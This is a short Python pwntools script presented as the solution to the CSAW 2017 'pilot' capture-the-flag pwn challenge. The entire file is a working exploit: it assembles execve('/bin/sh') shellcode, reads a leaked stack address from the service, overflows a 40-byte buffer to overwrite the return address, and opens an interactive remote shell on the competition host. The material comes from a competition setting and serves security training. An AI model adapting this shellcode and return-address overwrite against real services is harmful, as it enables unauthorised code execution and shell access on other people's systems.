"""
CSAW 2017 pilot pwn challenge solution
"""
# Imports
import sys
from pwn import *
# Set pwntools context to amd64
context.update(arch='amd64')

# Global debug flag
DEBUG = True

# execv('/bin/sh', NULL, NULL) shellcode
bin_sh_shellcode = asm(
'''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''
)

def main():
  # Connect to challenge
  if DEBUG:
    p = remote('localhost', 8464)
    print "Connected to challenge and waiting for debugger to attach. Press any key to continue..."
    sys.stdin.read(1)
  else:
    p = remote('pwn.chal.csaw.io', 8464)

  # Read input from challenge
  p_stdout = p.recvuntil('[*]Command:')

  # Regex out the return address from challenge stdout
  ret_address = re.search(r'(0x[0-9,a-f]{12})', p_stdout).group(0) 

  # Build exploit shellcode
  exploit = bin_sh_shellcode + 'A' * (40 - len(bin_sh_shellcode)) + p64(int(ret_address,16)) 

  # Send the exploit shellcode
  p.sendline(exploit)

  # Interact with remote shell
  p.interactive()

if __name__ == '__main__':
  main()
